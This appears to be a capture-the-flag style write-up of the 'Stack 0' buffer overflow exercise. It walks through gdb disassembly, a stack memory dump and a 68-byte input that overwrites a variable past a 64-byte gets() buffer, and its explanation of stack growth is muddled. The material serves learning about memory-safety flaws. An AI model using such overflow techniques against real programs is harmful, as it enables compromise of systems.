# Stack 0

### Overview
        The esp(current stack pointer) grows upward when allocating memory 
        and the higher the esp goes, it points to smaller address number.
        Thus, you need to overwrite all the space of buffer(64 bytes) 
        and then overwrite the allocated space for int modified.

### Process
    $ gdb -q ./stack0
    (gdb) disas main
        Dump of assembler code for function main:
            0x080483f4 <+0>:     push   %ebp
            0x080483f5 <+1>:     mov    %esp,%ebp
            0x080483f7 <+3>:     and    $0xfffffff0,%esp
            0x080483fa <+6>:     sub    $0x60,%esp
            0x080483fd <+9>:     movl   $0x0,0x5c(%esp)
            0x08048405 <+17>:    lea    0x1c(%esp),%eax
            0x08048409 <+21>:    mov    %eax,(%esp)
            0x0804840c <+24>:    call   0x804830c <gets@plt>
            0x08048411 <+29>:    mov    0x5c(%esp),%eax
            0x08048415 <+33>:    test   %eax,%eax
            0x08048417 <+35>:    je     0x8048427 <main+51>
            0x08048419 <+37>:    movl   $0x8048500,(%esp)
            0x08048420 <+44>:    call   0x804832c <puts@plt>
            0x08048425 <+49>:    jmp    0x8048433 <main+63>
            0x08048427 <+51>:    movl   $0x8048529,(%esp)
            0x0804842e <+58>:    call   0x804832c <puts@plt>
            0x08048433 <+63>:    leave
            0x08048434 <+64>:    ret
        End of assembler dump.
    (gdb) b *main+29
    (gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
            Breakpoint 1, main (argc=1,argv=0xffffd634) at stack0/stack0.c:13
            13      stack0/stack0.c: No such file or directory.
    (gdb) x/60x $esp
        0xffffd530: 0xffffd54c  0xffffd5d4  0xf7fb8000  0x0000cd57
        0xffffd540: 0xffffffff  0x0000002f  0xf7e12dc8  0x41414141
        0xffffd550: 0x41414141  0x41414141  0x41414141  0x41414141
        0xffffd560: 0x41414141  0x41414141  0x41414141  0x41414141
        0xffffd570: 0x41414141  0x41414141  0x00004141  0xf7e34c0b
        0xffffd580: 0xf7fb83dc  0x080481e8  0x0804845b  0x00000000
        0xffffd590: 0xf7fb8000  0xf7fb8000  0x00000000  0xf7e1e637
        0xffffd5a0: 0x00000001  0xffffd634  0xffffd63c  0x00000000
        0xffffd5b0: 0x00000000  0x00000000  0xf7fb8000  0xf7ffdc04
        0xffffd5c0: 0xf7ffd000  0x00000000  0xf7fb8000  0xf7fb8000
        0xffffd5d0: 0x00000000  0x607935e6  0x5c199bf6  0x00000000
        0xffffd5e0: 0x00000000  0x00000000  0x00000001  0x08048340
        0xffffd5f0: 0x00000000  0xf7fedf10  0xf7fe8780  0xf7ffd000
        0xffffd600: 0x00000001  0x08048340  0x00000000  0x08048361
        0xffffd610: 0x080483f4  0x00000001  0xffffd634  0x08048450

    buffer[64]: from last stack of line 0xffffd540 
                to 3rd stack of line 0xffffd580 
                -> 64 bytes needs to be overwritten
    modified: from last stack of line 0xffffd580
### Method
    Use more than 64 bytes to overwrite

### Answer
    $ python -c 'print "A"*68' | ./stack0
    you have changed the 'modified' variable

    

    
    
    
